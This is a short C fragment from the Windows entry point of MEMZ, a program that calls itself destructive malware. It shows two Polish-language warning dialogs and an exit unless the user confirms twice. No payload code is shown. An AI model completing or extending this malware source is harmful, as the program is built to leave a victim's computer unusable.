...
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpwCmdLine, int nCmdShow) {
	...
	if (argc > 1) {
		...
		if (MessageBoxA(NULL, "Oprogramowanie, które właśnie uruchomiłeś, jest uważane za złośliwe oprogramowanie.\r\n\
To złośliwe oprogramowanie wyrządzi szkody Twojemu komputerowi i sprawi, że nie będzie nadawał się do użytku.\r\n\
Jeśli widzisz ten komunikat, nie wiedząc, co właśnie wykonałeś, po prostu naciśnij Nie i nic się nie stanie.\r\n\
Jeśli wiesz, co robi to złośliwe oprogramowanie i używasz bezpiecznego środowiska do testowania, \
naciśnij Tak, aby go uruchomić.\r\n\r\n\
CZY CHCESZ URUCHOMIĆ TO ZŁOŚLIWE OPROGRAMOWANIE, Wskutek czego MASZYNA NIE NADAJE SIĘ DO UŻYTKOWANIA?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES ||
MessageBoxA(NULL, "TO OSTATNIE OSTRZEŻENIE!\r\n\r\n\
TWÓRCA NIE PONOSI ODPOWIEDZIALNOŚCI ZA JAKIEKOLWIEK SZKODY POWSTAŁE PRZY UŻYCIU TEGO ZŁOŚLIWEGO OPROGRAMOWANIA!\r\n\
NADAL TO WYKONUJESZ?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
			ExitProcess(0);
		}
